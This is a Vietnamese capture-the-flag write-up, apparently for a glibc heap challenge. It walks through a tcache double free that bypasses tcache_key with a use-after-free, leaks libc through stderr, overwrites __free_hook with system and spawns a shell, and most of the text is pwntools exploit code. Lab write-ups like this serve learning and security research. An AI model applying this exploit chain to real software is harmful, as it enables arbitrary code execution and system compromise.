  - Ở phiên bản này mục tiêu của ta là double free để malloc 1 chunk tùy ý. Tuy nhiên tại vị trí fd+8 của chunk được free được set 1 giá trị là tcache_key, giá trị này được kiểm tra mỗi khi chunk đó được free do đó ta cần phải thay đổi giá trị này bằng uaf.
  - Mục tiêu là ghi đè vào free_hook thành system. Đầu tiên ta sẽ leak libc bằng stderr rồi, cấp phát vào free_hook.
  - xóa tcache_key và double free
  ```
  size = 0x30
  book(1, size)
  choice(3)
  book(2, size, b'\x00'*16)
  choice(3)
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218760593-10d4c7f5-5255-4377-bf2c-3ec031972a7f.png)
  - ![image](https://user-images.githubusercontent.com/113702087/218760746-c6acd4a1-ef5e-4f73-ba9a-bc7b1dad6ac5.png)
  - leak libc
  ```
  book(2, size, p64(exe.sym['stderr']))
  book(1, size)
  book(1, size, b'\xc0')
  choice(4)
  r.recvuntil(b'Content: ')
  libc_leak = r.recv(6)
  libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['_IO_2_1_stderr_']
  print(hex(libc.address))
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218760954-68b9bd23-3983-4d95-862a-93b7ce1091f9.png)
  - ghi đè free_hook
  ```
  book(1, size)
choice(3)
book(2, size, b'\x00'*16)
choice(3)
book(2, size, p64(libc.sym['__free_hook']))
book(1, size)
book(1, size, p64(libc.sym['system']))
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218761451-b0990d15-a45c-42fa-b05a-dcf5c6b4e0e5.png)
  - getshell
  ```
  book(1, size, b'/bin/sh\x00')
choice(3)
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218761587-63516997-3ea7-4743-bc08-40b5e28af71f.png)
